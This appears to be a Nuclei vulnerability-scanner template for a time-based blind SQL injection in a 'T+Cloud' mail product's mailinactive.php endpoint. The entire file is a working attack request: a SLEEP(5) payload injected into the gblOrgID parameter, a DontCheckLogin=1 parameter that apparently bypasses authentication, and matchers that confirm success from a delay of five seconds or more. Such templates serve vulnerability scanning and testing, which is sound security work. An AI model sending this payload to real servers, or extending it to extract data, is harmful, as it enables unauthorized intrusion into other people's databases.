id: T+Cloud-maillinactive-SqlInjection

info:
  name: T+Cloud-maillinactive-SqlInjection
  author: iSee857
  severity: high
  description: T+Cloud-maillinactive-SqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+-&DontCheckLogin=1 HTTP/1.1
        Host: {{Host}}
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200